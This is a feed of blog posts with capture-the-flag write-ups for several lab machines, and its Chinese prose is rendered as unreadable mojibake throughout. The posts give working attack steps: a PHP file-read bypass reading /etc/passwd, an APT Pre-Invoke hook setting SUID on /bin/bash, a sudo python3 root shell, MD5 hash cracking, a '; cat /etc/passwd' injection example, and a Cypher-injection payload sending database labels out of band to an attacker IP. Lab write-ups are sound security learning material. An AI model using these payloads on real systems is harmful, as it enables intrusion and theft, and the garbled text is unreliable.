200      GET      186l      943w    74237c http://merchan.thl/images/llavero.jpg
200      GET      130l      399w     7235c http://merchan.thl/
200      GET        1l       15w     1365c http://merchan.thl/secret.js
```

è¢«æ··æ·†è¿‡äº†

![image.png](/post-images/TheHackersLabsMerchan/image2.png)

ç›´æ¥é€šè¿‡ AI å¤åŸå³å¯

```bash
function createLink(){
    const _0xd35862 = _0x4b23, // _0xd35862 æ˜¯è§£ç å‡½æ•°çš„åˆ«å
          _0x398463 = '2e81eb4e952a3268babddecad2a4ec1e.php',
          _0x199a7f = document[_0xd35862(0x17b)]('a');

    _0x199a7f[_0xd35862(0x17d)] = _0xd35862(0x171);
    _0x199a7f[_0xd35862(0x177)] = _0x398463;
    document[_0xd35862(0x174)][_0xd35862(0x179)](_0x199a7f);
}
_0xd35862(0x17b) -> è§£ç åæ˜¯ 'createElement'
_0xd35862(0x17d) -> è§£ç åæ˜¯ 'innerText'
_0xd35862(0x171) -> è§£ç åæ˜¯ 'Haga\x20click\x20aqui' (å³ "Haga click aqui")
_0xd35862(0x177) -> è§£ç åæ˜¯ 'href'
_0xd35862(0x174) -> è§£ç åæ˜¯ 'body'
_0xd35862(0x179) -> è§£ç åæ˜¯ 'appendChild'
```

ä¹Ÿå°±æ˜¯ä¼šæ‰“å¼€ `2e81eb4e952a3268babddecad2a4ec1e.php`

ä½†æ˜¯æˆ‘ä»¬è·³è½¬åå‘ç°ï¼Œè¿˜æ˜¯ä¼šæç¤º `403` ï¼ˆä»»ä½• `php` é¡µé¢éƒ½æ˜¯ï¼‰

![image.png](/post-images/TheHackersLabsMerchan/image3.png)

å°è¯•`bypass403` ï¼Œç›´æ¥åŠ ä¸Šæ–œæ å³å¯

![image.png](/post-images/TheHackersLabsMerchan/image4.png)

ä½†æ˜¯è®¿é—®è¿˜æ˜¯ç©ºç™½çš„

![image.png](/post-images/TheHackersLabsMerchan/image5.png)

### æ¨¡ç³Šæµ‹è¯•

æˆ‘ä»¬å¯¹å…¶è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼Œé¦–å…ˆæµ‹è¯•ä»»æ„æ–‡ä»¶è¯»å–

ä½†æ˜¯åŠ ä¸Šå‚æ•°åï¼Œè¿˜æ˜¯æç¤ºäº† `403`

```bash
http://merchan.thl/2e81eb4e952a3268babddecad2a4ec1e.php?FUZZ=/etc/passwd
```

å†æ¬¡è¿›è¡Œç»•è¿‡

è¿™é‡Œå·¥å…·å¹¶æ— æ³•è¿›è¡Œç»•è¿‡äº†

![image.png](/post-images/TheHackersLabsMerchan/image6.png)

æˆ‘ä»¬è¿›è¡Œæ‰‹åŠ¨ç»•è¿‡ï¼Œæœ€ååŠ ä¸Š `Referer` å³å¯ç»•è¿‡

![image.png](/post-images/TheHackersLabsMerchan/image7.png)

æˆ‘ä»¬å†æ¬¡è¿›è¡Œ

```bash
âœ  Merchan ffuf -u 'http://merchan.thl/2e81eb4e952a3268babddecad2a4ec1e.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt -H 'Referer: http://merchan.thl/' --fs=0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://merchan.thl/2e81eb4e952a3268babddecad2a4ec1e.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt
 :: Header           : Referer: http://merchan.thl/
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

file                    [Status: 200, Size: 1187, Words: 27, Lines: 23, Duration: 0ms]
```

### ä»»æ„æ–‡ä»¶è¯»å– & å¯†ç çˆ†ç ´

æšä¸¾å‡ºæ¥å‚æ•° `file`

![image.png](/post-images/TheHackersLabsMerchan/image8.png)

æˆ‘ä»¬è¯»å– `2e81eb4e952a3268babddecad2a4ec1e.php` çš„æºç 

```bash
<?php<br />
$file = $_GET['file'] ?? '';<br />
if ($file) {<br />
echo nl2br(file_get_contents($file));<br />
}<br />
?><br />
```

åˆ°è¿™é‡Œæµ‹è¯•äº†å¯ä»¥ä½¿ç”¨ä¼ªåè®®ä½†æ˜¯ä¸èƒ½æ‰§è¡Œè¯­å¥ï¼Œä¹Ÿä¸å¯ä»¥åŒ…å«ï¼Œ`julia` å‰ `5000` ä¹Ÿæ²¡çˆ†ç ´å‡ºæ¥æœ‰ç‚¹æ²¡æ€è·¯

![image.png](/post-images/TheHackersLabsMerchan/image9.png)

çœ‹äº†ä¸‹ `WP`ï¼Œå‘ç°å¯†ç åœ¨ `rockyou` `7000`è¡Œâ€¦ (PSï¼šè§„åˆ™æ˜æ˜è¯´çˆ†ç ´éœ€è¦è®¾ç½®ä¸è¶…`5000`è¡Œçš„)

![image.png](/post-images/TheHackersLabsMerchan/image10.png)

ç”¨æˆ·å®¶ç›®å½•ä¸‹è¯»å– `user.txt`

```bash
julia@Thehackerslabs-merchan:~$ cat user.txt 
b4axxxxxxxxxxxxxxxxxxxxxxxxx
```

## æƒé™æå‡

`sudo` æƒé™ 

```bash
julia@Thehackerslabs-merchan:~$ sudo -l
sudo: unable to resolve host Thehackerslabs-merchan: Fallo temporal en la resoluciÃ³n del nombre
[sudo] contraseÃ±a para julia: 
Sorry, user julia may not run sudo on Thehackerslabs-merchan.
```

ä¸Šä¼  `linpeas`

```bash
â•”â•â•â•â•â•â•â•â•â•â•â•£ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
â•š https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files 
/dev/mqueue
/dev/shm
/etc/apt/apt.conf.d
/home/julia
```

çœ‹åˆ°ä¸€ä¸ªæœ‰è¶£çš„å¯å†™ç›®å½• `/etc/apt/apt.conf.d`

> https://zhuanlan.zhihu.com/p/1888937295215851002
> 

å½“ç³»ç»Ÿè¿è¡Œ `apt update` æ—¶ï¼Œä¼šåŠ è½½ `/etc/apt/apt.conf.d` æ–‡ä»¶å¤¹çš„æ‰€æœ‰é…ç½®æ–‡ä»¶

```scheme
echo 'APT::Update::Pre-Invoke {"chmod +s /bin/bash"}' > a
```

è¿‡äº†ä¸€ä¼šä¹‹åæˆ‘ä»¬å†æŸ¥çœ‹ `/bin/bash` æƒé™

![image.png](/post-images/TheHackersLabsMerchan/image11.png)

è¯»å– `root.txt`

```scheme
bash-5.2# cat root.txt 
056e7xxxxxxxxxxxxxxxxxxxxxxxx
```]]></content:encoded>
            <category>é¶æœº</category>
            <category>TheHackersLabs</category>
            <category>Linux</category>
            <category>APT</category>
            <category>LFI</category>
            <category>Crack</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - HEXTHINK SILENT SHADOW]]></title>
            <link>https://www.sunsetaction.top/2025/07/31/TheHackersLabsHEXTHINK SILENT SHADOW</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/31/TheHackersLabsHEXTHINK SILENT SHADOW</guid>
            <pubDate>Thu, 31 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[HEXTHINK SILENT SHADOW https://labs.thehackerslabs.com/machine/110 Recon PortScan æšä¸¾ è®¿é—® HTTP ï¼Œæç¤ºäº†å¾ˆæœ‰æ„æ€çš„ä¸œè¥¿ å¾—åˆ°æ•°æ®åº“çš„ç”¨æˆ· ctf user è¿æ¥æ•°æ®åº“ï¼Œæ„å¤–çš„å‘ç°ä¸ç”¨æ•°æ®åº“ æ•°æ®åº“é‡Œé¢å¥½å‡ ä¸ªè¡¨ï¼ˆ...]]></description>
            <content:encoded><![CDATA[
# HEXTHINK SILENT SHADOW

> https://labs.thehackerslabs.com/machine/110
> 

![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image.png)

## Recon

### PortScan

```bash
âœ  HEXTHINK_SILENT_SHADOW nmap -sT -min-rate 10000 -p- 192.168.56.97
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 21:39 CST
Nmap scan report for 192.168.56.97
Host is up (0.00038s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
9090/tcp open  zeus-admin
MAC Address: 08:00:27:78:E8:00 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.42 seconds
```

```bash
âœ  HEXTHINK_SILENT_SHADOW nmap -sT -A -p 22,80,3306,9090 192.168.56.97                           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 21:41 CST
Nmap scan report for 192.168.56.97         
Host is up (0.00041s latency).
                                                                                                
PORT     STATE SERVICE    VERSION                                                                                                                                                               
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:        
|   256 4d:6e:39:a4:15:86:88:70:c7:9d:09:91:a3:0b:18:8c (ECDSA)
|_  256 f9:21:5d:25:ee:76:05:db:01:3b:45:c9:68:b0:82:9f (ED25519)
80/tcp   open  http       Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)                                                    
|_http-title: Site doesn''t have a title (text/html; charset=UTF-8).
3306/tcp open  mysql      MariaDB 5.5.5-10.11.11 
| mysql-info:      
|   Protocol: 10         
|   Version: 5.5.5-10.11.11-MariaDB-0ubuntu0.24.04.2
|   Thread ID: 35                                                                                                                                                                               
|   Capabilities flags: 63486                                                                   
|   Some Capabilities: SupportsCompression, Support41Auth, IgnoreSpaceBeforeParenthesis, ODBCClient, DontAllowDatabaseTableColumn, IgnoreSigpipes, ConnectWithDatabase, SupportsTransactions, Speaks41ProtocolOld, InteractiveClient, Speaks41ProtocolNew, FoundRows, SupportsLoadDataLocal, LongColumnFlag, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit                                                                                                                                                                          
|   Salt: BwQo]cXnB?UoLmc(9'Wb                                                                  
|_  Auth Plugin Name: mysql_native_password
9090/tcp open  tcpwrapped     
MAC Address: 08:00:27:78:E8:00 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)                
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                                           
Device type: general purpose                                                                    
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19                                                                   
Network Distance: 1 hop                                                                         
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                         
                                                                                                
TRACEROUTE                                                                                      
HOP RTT     ADDRESS
1   0.41 ms 192.168.56.97
                                                                                                
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                           
Nmap done: 1 IP address (1 host up) scanned in 13.54 seconds 
```

### æšä¸¾

è®¿é—® `HTTP` ï¼Œæç¤ºäº†å¾ˆæœ‰æ„æ€çš„ä¸œè¥¿

![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image1.png)

å¾—åˆ°æ•°æ®åº“çš„ç”¨æˆ· `ctf_user`

è¿æ¥æ•°æ®åº“ï¼Œæ„å¤–çš„å‘ç°ä¸ç”¨æ•°æ®åº“

![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image2.png)

æ•°æ®åº“é‡Œé¢å¥½å‡ ä¸ªè¡¨ï¼ˆè´¦æˆ·ï¼Œé›‡å‘˜ï¼Œæ¶ˆæ¯ï¼Œä¾›åº”å•†ï¼Œç”¨æˆ·ï¼‰ï¼Œè¿˜å­˜äº†ä¸€äº›å›¾ç‰‡

ä¸€äº›æœ‰è¶£çš„ä¿¡æ¯ï¼š

```bash
Buscamos pentesters sin miedo. Contacto interno: d3v@n0m41n.
//
admin	21232f297a57a5a743894a0e4a801fc3
test	098f6bcd4621d373cade4e832627b4f6
support	e99a18c428cb38d5f260853678922e03
h4cker	5f4dcc3b5aa765d61d8327deb882cf99
```

æˆ‘ä»¬å°†ç”¨æˆ·è¡¨è¿›è¡Œçˆ†ç ´

![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image3.png)

```bash
âœ  HEXTHINK_SILENT_SHADOW john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 users
Using default input encoding: UTF-8
Loaded 4 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
password         (h4cker)     
abc123           (support)     
admin            (admin)     
test             (test)     
4g 0:00:00:00 DONE (2025-07-30 21:54) 200.0g/s 8313Kp/s 8313Kc/s 9350KC/s tyson4..tauruz
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

ç›®å½•çˆ†ç ´

```bash
âœ  HEXTHINK_SILENT_SHADOW feroxbuster --url http://192.168.56.97/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x asp,php,txt,zip
                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ğŸ¤“                 ver: 2.11.0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ¯  Target Url            â”‚ http://192.168.56.97/
 ğŸš€  Threads               â”‚ 50
 ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 ğŸ’¢  Status Code Filters   â”‚ [404, 503, 400]
 ğŸ’¥  Timeout (secs)        â”‚ 7
 ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0
 ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ğŸ”  Extract Links         â”‚ true
 ğŸ’²  Extensions            â”‚ [asp, php, txt, zip]
 ğŸ  HTTP methods          â”‚ [GET]
 ğŸ”ƒ  Recursion Depth       â”‚ 4
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        3l       38w      383c http://192.168.56.97/
200      GET      872l     4588w    76866c http://192.168.56.97/index2.php
200      GET        3l       38w      383c http://192.168.56.97/index.php
301      GET        9l       28w      319c http://192.168.56.97/javascript => http://192.168.56.97/javascript/
200      GET      872l     4588w    76849c http://192.168.56.97/info.php
301      GET        9l       28w      326c http://192.168.56.97/javascript/jquery => http://192.168.56.97/javascript/jquery/
[####################] - 3m   3114515/3114515 0s      found:7       errors:4      
[####################] - 3m   1038145/1038145 5925/s  http://192.168.56.97/ 
[####################] - 3m   1038145/1038145 5868/s  http://192.168.56.97/javascript/ 
[####################] - 3m   1038145/1038145 6569/s  http://192.168.56.97/javascript/jquery/ 
```

`index2.php` å’Œ `info.php` æ˜¯ä¸€æ ·çš„

![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image4.png)

æ‰«æåå‘ç°ï¼Œç”¨æˆ·è¡¨ä¸­ä¿¡æ¯æ— ç”¨ï¼Œæˆ‘å·²ç»å°†å…¶æ‹¿å»è¿›è¡Œçˆ†ç ´äº†ï¼Œä½†æ˜¯æ²¡æœ‰ç»“æœ

ç„¶å `notice`è¡¨ä¸­ï¼Œæœ‰ä¸€ä¸ª â€˜ä½ å·²ç»èµ°äº†å¾ˆé•¿ä¸€æ®µè·¯ã€‚ä½†è¿˜æœ‰å¾ˆé•¿çš„è·¯è¦èµ°â€¦â€¦â€™ï¼Œå¹¶é™„ä¸Šäº†ä¸€å¼ ç…§ç‰‡

![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image5.png)

æˆ‘ä»¬å°†ç…§ç‰‡ä¿å­˜ä¸‹æ¥ï¼Œæ ¼å¼æ˜¯ `JPG`

![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image6.png)

æˆ‘ä»¬å°è¯•æå–ä¿¡æ¯

```bash
âœ  HEXTHINK_SILENT_SHADOW binwalk -Me --run-as=root 2.jpg    

Scan Time:     2025-07-30 22:34:11
Target File:   /root/Desktop/TheHackersLabs/HEXTHINK_SILENT_SHADOW/2.jpg
MD5 Checksum:  1576b20a92fe6ac42b11889e1f790aa1
Signatures:    436

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented

âœ  HEXTHINK_SILENT_SHADOW stegseek 2.jpg            
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "hello"
[i] Original filename: "instrucciones.txt".
[i] Extracting to "2.jpg.out".
```

æœ€åä½¿ç”¨ `StegSeek` èƒ½è·å–åˆ°ä¸œè¥¿

```bash
âœ  HEXTHINK_SILENT_SHADOW cat 2.jpg.out                 
Para continuar deberÃ¡s abrir el Puerto 9090

Esto no es un escaneo Es un saludo

EnvÃ­a la siguiente cadena al puerto 9090:

LOGIN whisper
KEY whisper9090

No lo hagas mal Solo hay una oportunidad
```

è®©æˆ‘å°†å…¶å‘é€åˆ° `9090`ï¼Œå¹¶ä¸”åªæœ‰ä¸€æ¬¡æœºä¼š

```bash
âœ  HEXTHINK_SILENT_SHADOW echo "LOGIN whisper\nKEY whisper9090" | nc 192.168.56.97 9090
Usuario SSH: whisper
ContraseÃ±a: 7h3m1nDf0x
```

å‘é€åå¾—åˆ°ä¸€ç»„è´¦æˆ·å‡­æ®

æˆ‘ä»¬è¿›è¡Œ `SSH` ç™»å½•ï¼Œæ‹¿ `user.txt`

```bash
whisper@server:~$ cat user.txt 
THL{8axxxxxxxxxxxxxx
```

## æƒé™æå‡

`sudo` æƒé™

```bash
whisper@server:~$ sudo -l
Matching Defaults entries for whisper on server:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User whisper may run the following commands on server:
    (ALL) NOPASSWD: /usr/bin/python3
```

æ¢­å“ˆ

```bash
whisper@server:~$ sudo /usr/bin/python3 -c "import os;os.system('/bin/bash -p')"
root@server:/home/whisper# 
```

```bash
root@server:~# cat root.txt 
THL{Zpxxxxxxxxxxxxxxxxx
```]]></content:encoded>
            <category>é¶æœº</category>
            <category>TheHackersLabs</category>
            <category>Linux</category>
            <category>Mysql</category>
            <category>Python</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Season7 - Cypher]]></title>
            <link>https://www.sunsetaction.top/2025/07/29/HackTheBoxSeason7-Cypher</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/29/HackTheBoxSeason7-Cypher</guid>
            <pubDate>Fri, 04 Apr 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Season7 Cypher https://app.hackthebox.com/machines/Cypher | Linux Â· Medium å‰æœŸè¸©ç‚¹ 10.10.11.57 æ˜¯é¶æœº å‘ç°åŸŸå http://cypher.htb/ æ·»åŠ åˆ°hostsæ–‡ä»¶ æ‰«æUDPç«¯å£ æ‰«æä¸€ä¸‹å­åŸŸå è®¿é—®H...]]></description>
            <content:encoded><![CDATA[# Season7-Cypher

> https://app.hackthebox.com/machines/Cypher | `Linux Â· Medium`
> 

## å‰æœŸè¸©ç‚¹

`10.10.11.57` æ˜¯é¶æœº

```bash
âš¡ root@kali î‚° ~/Desktop/test/cypher î‚° nmap -sT -min-rate 10000 -p- 10.10.11.57              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 07:19 EST
Nmap scan report for 10.10.11.57
Host is up (0.13s latency).
Not shown: 65352 filtered tcp ports (no-response), 181 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.15 seconds
```

å‘ç°åŸŸå `http://cypher.htb/` æ·»åŠ åˆ°`hosts`æ–‡ä»¶

```bash
âš¡ root@kali î‚° ~/Desktop/test/cypher î‚° nmap -sT -A -T4 -O -p 22,80 10.10.11.57               
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 07:20 EST
Nmap scan report for 10.10.11.57
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cypher.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   502.38 ms 10.10.16.1
2   586.07 ms 10.10.11.57

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.03 seconds
```

æ‰«æ`UDP`ç«¯å£

```bash
âš¡ root@kali î‚° ~/Desktop/test/cypher î‚° nmap -sU -min-rate 10000 -p- cypher.htb 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 07:25 EST
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for cypher.htb (10.10.11.57)
Host is up (4.6s latency).
Not shown: 65517 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
476/udp   closed tn-tl-fd1
5749/udp  closed unknown
16119/udp closed unknown
16380/udp closed unknown
16424/udp closed unknown
32237/udp closed unknown
33895/udp closed unknown
39619/udp closed unknown
40153/udp closed unknown
42240/udp closed unknown
42704/udp closed unknown
45096/udp closed unknown
53762/udp closed unknown
55811/udp closed unknown
56083/udp closed unknown
59387/udp closed unknown
60627/udp closed unknown
62347/udp closed unknown
```

æ‰«æä¸€ä¸‹å­åŸŸå

```bash
âš¡ root@kali î‚° ~/Desktop/test/cypher î‚° wfuzz -c -w ../../Dict/SecLists-2024.3/Discovery/DNS/subdomains-top1million-5000.txt --hc=302 -H 'Host:FUZZ.cypher.htb' -u http://cypher.htb                               

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://cypher.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                       
=====================================================================

Total time: 199.7973
Processed Requests: 4989
Filtered Requests: 4989
Requests/sec.: 24.97030
```

è®¿é—®`HTTP`ä¸»é¡µï¼Œè¿™ä¸ªåŠ¨ç”»æ•ˆæœå°†æˆ‘çš„`Kali`å‡»ç¢

![image.png](/post-images/HackTheBoxSeason7-Cypher/image27.png)

è²Œä¼¼åœ¨ç™»å½•æ¡†å­˜åœ¨`SQL`æ³¨å…¥ï¼Œä½¿ç”¨`SQLMAP`å’Œæ‰‹åŠ¨æ³¨å…¥æ— æœ

![image.png](/post-images/HackTheBoxSeason7-Cypher/image28.png)

æ‰«æç›®å½•

```bash
âš¡ root@kali î‚° ~/Desktop/test/cypher î‚° dirsearch -u cypher.htb -x 403,404,429 -e php,zip,txt                                                                        
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439

Output File: /root/Desktop/test/cypher/reports/_cypher.htb/_25-03-02_08-33-32.txt

Target: http://cypher.htb/

[08:33:32] Starting: 
[08:33:56] 200 -    5KB - /about
[08:34:17] 307 -    0B  - /api/  ->  http://cypher.htb/api/api
[08:34:17] 307 -    0B  - /api  ->  /api/docs
[08:34:42] 307 -    0B  - /demo  ->  /login
[08:34:42] 307 -    0B  - /demo/  ->  http://cypher.htb/api/demo
[08:35:10] 200 -    4KB - /login
[08:35:10] 200 -    4KB - /login.html
[08:35:49] 301 -  178B  - /testing  ->  http://cypher.htb/testing/
```

å‘ç°æ–°ç›®å½•`testing` ï¼Œè®¿é—®ä¸‹è½½äº†`jar`æ–‡ä»¶

![image.png](/post-images/HackTheBoxSeason7-Cypher/image29.png)

## åç¼–è¯‘ jar

å°†`jar`æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œä½¿ç”¨`jd-gui`åç¼–è¯‘

![image.png](/post-images/HackTheBoxSeason7-Cypher/image30.png)

åœ¨å…¶ä¸­å‘ç°è²Œä¼¼å¯ä»¥å‘½ä»¤æ‰§è¡Œåœ°æ–¹

```bash
String[] command = { "/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url };
```

ä¸¢åˆ°`GPT`é‡Œè¿›è¡Œåˆ†æï¼š

- è¯¥ Java ä»£ç æ˜¯ Neo4j è‡ªå®šä¹‰ APOCï¼ˆAwesome Procedures on Cypherï¼‰æ‰©å±•çš„ä¸€éƒ¨åˆ†ï¼Œæä¾› `custom.getUrlStatusCode` è¿‡ç¨‹ã€‚
- è¯¥è¿‡ç¨‹æ¥æ”¶ä¸€ä¸ª URLï¼Œä½¿ç”¨ `curl` å‘½ä»¤è·å–å…¶ HTTP çŠ¶æ€ç ï¼Œå¹¶è¿”å›ã€‚
- **æ”»å‡»ç¤ºä¾‹æ‰§è¡Œæ•ˆæœ**è¿™ä¼šå¯¼è‡´æœåŠ¡å™¨æ³„éœ²æ•æ„Ÿæ–‡ä»¶ `/etc/passwd`ã€‚
    
    ```
    CALL custom.getUrlStatusCode("https://example.com; cat /etc/passwd")
    ```
    
    ```
    curl -s -o /dev/null --connect-timeout 1 -w %{http_code} https://example.com; cat /etc/passwd
    ```
    

## Cypher Injection

çœ‹åˆ°`neo4j`æ‰å‘ç°ä¸Šé¢çš„å‹æ ¹ä¸æ˜¯`SQL`æ³¨å…¥ https://neo4j.com/docs/getting-started/cypher/

> Cypher is Neo4jâ€™s declarative andÂ GQL conformantÂ query language. Available as open source viaÂ The openCypher project, Cypher isÂ similar to SQL, but optimized for graphs. | Cypher æ˜¯ Neo4j çš„å£°æ˜å¼å’Œç¬¦åˆ GQL çš„æŸ¥è¯¢è¯­è¨€ã€‚Cypher å¯é€šè¿‡openCypher é¡¹ç›®ä»¥å¼€æºå½¢å¼è·å¾—ï¼Œå®ƒç±»ä¼¼äº SQLï¼Œä½†é’ˆå¯¹å›¾å½¢è¿›è¡Œäº†ä¼˜åŒ–ã€‚
> 

å°è¯•äº†ä½¿ç”¨`cyphermap`ä½†æ˜¯å§‹ç»ˆè¿”å›`Unable to find valid injection type...`

é€šè¿‡ ï¼šhttps://pentester.land/blog/cypher-injection-cheatsheet/#2-cypher-injection å¯ä»¥äº†è§£åˆ°`Cypher`æ³¨å…¥

éšä¾¿è¾“å…¥ç‚¹ä¸œè¥¿å¯ä»¥åœ¨é”™è¯¯ä¸­å‘ç°æŸ¥è¯¢è¯­å¥

```bash
{message: Variable `c` not defined (line 1, column 75 (offset: 74))
"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin' or 1=1 return c//' return h.value as hash"
                                                                           ^}
```

æˆåŠŸé—­åˆ

```bash
{"username":"admin' or 1=1 return h.value as hash//","password":"1" }
```

![image.png](/post-images/HackTheBoxSeason7-Cypher/image31.png)

å¸¦å¤–æµ‹è¯•

```bash
{"username":"admin'return h.value as hash UNION CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.16.34/' + label AS r RETURN r as hash//","password":"1" }
```

![image.png](/post-images/HackTheBoxSeason7-Cypher/image32.png)

